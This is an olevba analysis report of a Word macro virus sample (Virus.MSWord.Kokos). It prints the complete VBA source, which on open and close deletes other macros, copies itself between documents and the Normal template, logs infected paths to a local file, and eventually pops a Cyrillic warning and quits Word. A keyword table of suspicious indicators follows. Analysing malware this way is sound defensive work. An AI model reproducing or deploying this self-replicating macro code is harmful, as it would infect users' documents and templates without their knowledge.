olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kokos-ddfcc91063822f5a4627e744f75a5a740e00d5c1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO SoSok.cls 
in file: Virus.MSWord.Kokos-ddfcc91063822f5a4627e744f75a5a740e00d5c1 - OLE stream: 'Macros/VBA/SoSok'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
On Error Resume Next
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 If MacroContainer.FullName = ActiveDocument.FullName Then
  If nt.Name <> "SoSok" Then GoTo ClaudioNormal
 Else
  If ad.Name <> "SoSok" Then GoTo Aquilesdocument
 End If
GoTo Findelmundo
Aquilesdocument:
 lineas = ad.CodeModule.CountOfLines
 ad.CodeModule.DeleteLines 1, lineas
 lineas = 1
 Do While lineas <= nt.CodeModule.CountOfLines
    cadenadecodigo = nt.CodeModule.lines(lineas, 1)
    ad.CodeModule.insertlines lineas, cadenadecodigo
    lineas = lineas + 1
 Loop
 ad.Name = "SoSok"
 Open "C:\SoSok" For Append As #1
   Print #1, ActiveDocument.Path
 Close #1
 ActiveDocument.Save
GoTo Findelmundo
ClaudioNormal:
 lineas = nt.CodeModule.CountOfLines
 nt.CodeModule.DeleteLines 1, lineas
 lineas = 1
 Do While lineas <= ad.CodeModule.CountOfLines
    cadenadecodigo = ad.CodeModule.lines(lineas, 1)
    nt.CodeModule.insertlines lineas, cadenadecodigo
    lineas = lineas + 1
 Loop
 nt.Name = "SoSok"
 NormalTemplate.Save
Findelmundo:
If Dir("C:\SoSok", vbNormal) <> "" Then
If FileLen("C:\SoSok") > 500 Then
 Response = MsgBox("Îáíàðóæåí âèðóñ 'SoSok'. ×òî äåëàòü? Âûêëþ÷èòü êîìïüþòåð?", vbYes, "Êàðàóë!!!")
  Application.Quit SaveChanges:=wdPromptToSaveChanges
End If
End If

End Sub

Private Sub Document_Open()
 On Error Resume Next
 If ActiveDocument.VBProject.VBComponents.Count > 1 Then
 For op = 2 To ActiveDocument.VBProject.VBComponents.Count
   cantidad = ActiveDocument.VBProject.VBComponents.Item(op).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents.Item(op).CodeModule.DeleteLines 1, cantidad
 Next op
 End If
 If NormalTemplate.VBProject.VBComponents.Count > 1 Then
 For op = 2 To NormalTemplate.VBProject.VBComponents.Count
   cantidad = NormalTemplate.VBProject.VBComponents.Item(op).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents.Item(op).CodeModule.DeleteLines 1, cantidad
 Next op
 End If
 Document_Close

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

